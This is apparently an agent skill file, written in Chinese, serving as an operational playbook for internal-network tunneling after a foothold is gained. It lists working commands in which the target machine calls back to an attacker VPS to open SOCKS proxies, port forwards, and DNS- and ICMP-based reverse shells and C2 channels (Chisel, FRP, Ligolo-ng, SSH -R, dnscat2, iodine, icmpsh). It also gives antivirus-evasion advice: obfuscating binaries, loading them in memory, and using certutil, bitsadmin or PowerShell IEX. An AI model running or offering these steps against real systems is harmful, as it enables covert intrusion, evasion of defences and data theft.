---
name: 网道地道
description: 内网隧道与代理技术：Chisel/FRP/Ligolo-ng/NPS/SSH 反向隧道/DNS 隧道(dnscat2/iodine)/ICMP 隧道 的部署、用法与场景选型。
---
# 内网隧道与代理（Tunneling）

> 拿到内网立足点后，建立出站通道访问目标内网资源。覆盖：反向隧道、SOCKS5 代理、DNS/ICMP 隐蔽隧道、端口转发。

## 场景选型

| 场景 | 首选 | 备选 |
|------|------|------|
| 常规内网穿透（TCP 全通） | **Chisel** | FRP |
| 目标只能出站 HTTP/HTTPS | **FRP** / Chisel HTTPS | NPS |
| 目标 egress 只放行 DNS | **dnscat2** / iodine | — |
| 目标 egress 只放行 ICMP | **icmpsh** | — |
| 需要稳定多端口 SOCKS | **Ligolo-ng** | Chisel reverse |
| Linux 无额外工具 | **SSH -R 动态端口** | — |

## 一、Chisel（Go 单文件，最常用）

```bash
# VPS 服务端（reverse 模式）:
chisel server --reverse --port 8080 --socks5

# 目标机客户端:
chisel client <VPS_IP>:8080 R:1080:socks

# 本地使用:
#   浏览器/工具设 SOCKS5 127.0.0.1:1080
#   proxychains curl http://192.168.1.10
```

### Chisel 端口转发（非 SOCKS）
```bash
# 目标机回连，把目标内网某端口暴露到 VPS:
chisel client <VPS>:8080 R:8443:192.168.1.50:443
# VPS 上访问 8443 = 访问目标内网 192.168.1.50:443
```

### Chisel 免杀上传
```bash
# 目标机执行内存版（配合免杀）:
# 将 chisel.exe 做 XOR/AES 混淆后落地，或使用 .NET 内存加载
```

## 二、FRP（反向代理穿透）

```ini
# frps.toml (VPS):
bindPort = 7000

# frpc.toml (目标机):
serverAddr = "<VPS_IP>"
serverPort = 7000
[[proxies]]
name = "socks5"
type = "tcp"
remotePort = 1080
[proxies.plugin]
type = "socks5"
```

```bash
# 启动:
./frps -c frps.toml     # VPS
./frpc -c frpc.toml     # 目标机
# 本地: SOCKS5 127.0.0.1:1080
```

## 三、Ligolo-ng（透明隧道，无 SOCKS 链）

```bash
# VPS: 
./proxy -selfcert
# 目标机:
./agent -connect <VPS_IP>:11601 -ignore-cert
# 或隐藏: 
./agent -connect <VPS_IP>:443 -ignore-cert (代理后)

# proxy 交互: 输入 session → 选择 agent → start
# 之后 VPS 本机直接访问目标内网 IP（透明路由，无需 SOCKS）
# 加路由: sudo ip route add 192.168.1.0/24 dev tun0
```

## 四、SSH 反向隧道

```bash
# 目标机（Linux）:
ssh -R 1080:<VPS_IP>:1080 <vps_user>@<VPS_IP> -N -f   # 动态 SOCKS
ssh -R 8443:localhost:8443 <vps_user>@<VPS_IP> -N     # 端口转发
# 或反向跳板:
ssh -R 0.0.0.0:2222:localhost:22 <vps_user>@<VPS_IP> -N

# 安全注意: 目标机 SSHD 需开启 GatewayPorts 才能在 0.0.0.0 监听
```

## 五、DNS 隧道

```bash
# dnscat2:
# VPS: sudo ruby dnscat2.rb --dns "server=0.0.0.0,port=53,type=txt"
# 目标机: ./dnscat2-client example.com
# 建立 shell: window -i 1 → shell

# iodine:
# VPS: sudo iodined -f -P <pass> 10.0.0.1 tunnel.example.com
# 目标机: sudo iodine -f -P <pass> tunnel.example.com
# 隧道建立后: 通过 10.0.0.2 访问 C2
```

## 六、ICMP 隧道

```bash
# icmpsh:
# VPS: ./icmpsh_m.py <vps_ip> <target_public_ip>
# 目标机: ./icmpsh.exe -t <vps_ip> -d 500 -s 500
```

## 七、HTTP 隧道（穿透仅放行 80/443）

```text
1. 用 Chisel/FRP 的 HTTP 模式
2. 或 Cloudflare tunnel (cloudflared):
   # VPS: cloudflared tunnel run <tunnel-name>
   # 目标机: cloudflared tunnel --url http://localhost:8080 (内网服务暴露到公网)
3. 或 reverse-ssh / ratproxy 类工具
```

## 八、隧道落地与免杀

- 静态二进制（chisel/frp）可能被杀 → XOR/AES 混淆后落地，运行时内存解密
- 用 LOLBin 代替：`ssh`、`certutil`（下载）、`bitsadmin`、`powershell IEX`（内存加载 .NET 版）
- 优先 PowerShell/C# 内存版本，避免落盘

## 九、排障速查

```bash
# VPS 侧确认监听:
ss -tlnp | grep -E '8080|7000|11601'

# 目标机确认回连:
netstat -ano | grep <VPS_IP>
# Windows:
netstat -ano | findstr <VPS_IP>

# 测试隧道:
#   VPS: curl -x socks5://127.0.0.1:1080 http://192.168.1.10
#   或: proxychains4 curl http://192.168.1.10
```

## 参考
- `c2-framework` — C2 基础设施与流量隐蔽（含域前置/CDN）
- `network-penetration-testing` — 内网渗透主流程
